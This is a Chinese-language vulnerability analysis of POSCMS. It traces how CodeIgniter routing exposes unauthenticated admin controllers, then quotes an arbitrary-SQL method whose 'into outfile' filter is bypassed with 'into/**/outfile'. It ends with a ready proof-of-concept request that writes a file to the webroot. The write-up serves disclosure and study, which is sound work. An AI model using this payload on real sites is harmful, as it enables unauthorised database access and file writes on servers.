POSCMS 任意sql语句执行漏洞
==========================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 任意API调用

**分析入口文件**

> index.php \-\--\>/diy/init.php
> \-\-\-\-\--\>/diy/system/core/CodeIgniter.php

程序使用的CodeIgniter（CI）框架，直接去看CI框架。

    $RTR =& load_class('Router', 'core', isset($routing) ? $routing : NULL);

初始化Router类，调用\_set\_routing()方法绑定路由。

    if ( ! isset($this->directory))
                        {
                                $_d = $this->config->item('directory_trigger');
                                $_d = isset($_GET[$_d]) ? trim($_GET[$_d], " \t\n\r\0\x0B/") : '';

                                if ($_d !== '')
                                {
                                        $this->uri->filter_uri($_d);
                                        $this->set_directory($_d);
                                }
                        }

                        $_c = trim($this->config->item('controller_trigger'));
                        if ( ! empty($_GET[$_c]))
                        {
                                $this->uri->filter_uri($_GET[$_c]);
                                $this->set_class($_GET[$_c]);

                                $_f = trim($this->config->item('function_trigger'));
                                if ( ! empty($_GET[$_f]))
                                {
                                        $this->uri->filter_uri($_GET[$_f]);
                                        $this->set_method($_GET[$_f]);
                                }

                                $this->uri->rsegments = array(
                                        1 => $this->class,
                                        2 => $this->method
                                );
                        }
                        else
                        {
                                $this->_set_default_controller();
                        }

> config

    $config['controller_trigger']                        = 'c';
    $config['function_trigger']                                = 'm';
    $config['directory_trigger']                        = 'd';

简述这里就是

    $this->class = $_GET[‘c’];
    $this->method = $_GET[‘m’];
    $this->directory = $_GET[‘d’];

回到CI框架，这里直接通过反射进行了调用。

    $e404 = FALSE;
    $class = ucfirst($RTR->class);
    $method = $RTR->method;

    if (empty($class) OR ! file_exists(APPPATH.'controllers/'.$RTR->directory.$class.'.php'))
    {
       $e404 = TRUE;
    }
    else
    {
       require_once(APPPATH.'controllers/'.$RTR->directory.$class.'.php');

       if ( ! class_exists($class, FALSE) OR $method[0] === '_' OR method_exists('CI_Controller', $method))
       {
         $e404 = TRUE;
       }
       elseif (method_exists($class, '_remap'))
       {
         $params = array($method, array_slice($URI->rsegments, 2));
         $method = '_remap';
       }
       elseif ( ! method_exists($class, $method))
       {
         $e404 = TRUE;
       }
       /**
        * DO NOT CHANGE THIS, NOTHING ELSE WORKS!
        *
        * - method_exists() returns true for non-public methods, which passes the previous elseif
        * - is_callable() returns false for PHP 4-style constructors, even if there's a __construct()
        * - method_exists($class, '__construct') won't work because CI_Controller::__construct() is inherited
        * - People will only complain if this doesn't work, even though it is documented that it shouldn't.
        *
        * ReflectionMethod::isConstructor() is the ONLY reliable check,
        * knowing which method will be executed as a constructor.
        */
       elseif ( ! is_callable(array($class, $method)) && strcasecmp($class, $method) === 0)
       {
         $reflection = new ReflectionMethod($class, $method);
         if ( ! $reflection->isPublic() OR $reflection->isConstructor())
         {
          $e404 = TRUE;
         }
       }
    }

> APPPATH.'controllers/ = /diy/dayrui/controllers/

然后我们就可以调用这里的Controller，关键点是在这里有个admin文件夹，里面包含了管理员可调用的功能点，而且他继承的基类（SuperClass）并没有检测用户权限。就导致任意调用这里的功能点。

### SQL语句执行（增删改查）

既然可以调用管理员才能调用的功能点，问题就太多了，这里就随便讲一个喽。

文件：/diy/dayrui/controllers/admin/Db.php 方法：sql

     public function sql() {
        $sql = '';
        $count = $id = 0;

        if (IS_POST) {
            $id = $this->input->post('id');
            $sql = str_replace('{dbprefix}', $this->db->dbprefix, $this->input->post('sql'));
            if (preg_match('/select(.*)into outfile(.*)/i', $sql)) {
                $this->admin_msg(fc_lang('存在非法select'));
            }
            $sql_data = explode(';SQL_FINECMS_EOL', trim(str_replace(array(PHP_EOL, chr(13), chr(10)), 'SQL_FINECMS_EOL', $sql)));
            if ($sql_data) {
                $db = $this->db;
                foreach($sql_data as $query){
                    if (!$query) {
                        continue;
                    }
                    $queries = explode('SQL_FINECMS_EOL', trim($query));
                    $ret = '';
                    foreach($queries as $query) {
                        $ret.= $query[0] == '#' || $query[0].$query[1] == '--' ? '' : $query;
                    }
                    if (!$ret) {
                        continue;
                    }
                    $db->query($ret);
                    $count++;
                }
                if ($count == 1 && stripos($ret, 'select') === 0) {
                    $this->template->assign(array(
                        'result' => $db->query($ret)->result_array(),
                    ));
                }
            }
        }

        $this->template->assign(array(
            'menu' => $this->get_menu_v3(array(
                fc_lang('执行SQL') => array('admin/db/sql', 'database')
            )),
            'id' => $id,
            'sql' => $sql,
            'mcount' => $count,
        ));
        $this->template->display('db_sql.html');
    }

这里使用正则表达式匹配危险字符into
outfile，绕过就太简单了。into/\*\*/outfile。

### poc

`https://www.0-sec.org/index.php?c=db&amp;d=admin&amp;m=sql Post sql=select 1 into/**/outfile 'C:\phpstudy_pro\WWW\www.0-sec.org\poscms\11111.txt'`
